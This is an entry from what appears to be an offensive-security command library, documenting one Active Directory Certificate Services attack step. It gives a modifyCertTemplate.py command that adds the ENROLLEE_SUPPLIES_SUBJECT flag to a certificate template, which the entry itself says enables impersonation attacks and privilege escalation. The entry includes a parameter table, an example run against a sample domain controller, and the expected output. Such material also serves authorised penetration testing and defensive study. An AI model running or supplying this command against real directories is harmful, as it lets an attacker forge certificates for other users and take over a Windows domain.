---
type: command
executor: bash
data: >-
  python3 modifyCertTemplate.py $_DOMAIN/$_USERNAME -k -no-pass -template
  $_TEMPLATE_NAME -dc-ip $_DC_IP -add enrollee_supplies_subject -property
  mspki-Certificate-Name-Flag
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - ad-cs
  - privilege-escalation
verified: true
validated: true
---

# add-enrollee-supplies-subject-flag

## Command

```bash
python3 modifyCertTemplate.py $_DOMAIN/$_USERNAME -k -no-pass -template $_TEMPLATE_NAME -dc-ip $_DC_IP -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag
```

## Description

Adds the ENROLLEE_SUPPLIES_SUBJECT (ESS) flag to the certificate template's name flag property, allowing enrollees to supply custom subject names for impersonation attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain | Yes |
| $_USERNAME | Authenticating username | Yes |
| -k | Kerberos auth | Yes |
| -no-pass | No password | Yes |
| -template $_TEMPLATE_NAME | Template name (e.g., WebServer) | Yes |
| -dc-ip $_DC_IP | DC IP | Yes |
| -add enrollee_supplies_subject | Add the ESS flag | Yes |
| -property mspki-Certificate-Name-Flag | Target property | Yes |

## Examples

### Basic Usage

```bash
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template WebServer -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag
```

## Expected Output

```
Modified template: ESS flag added successfully.
No errors in LDAP update.
```

Verify with ACL query command.

## Related

- [[procedures/Active-Directory-Certificate-Services-Access-Control-Vulnerabilities]]
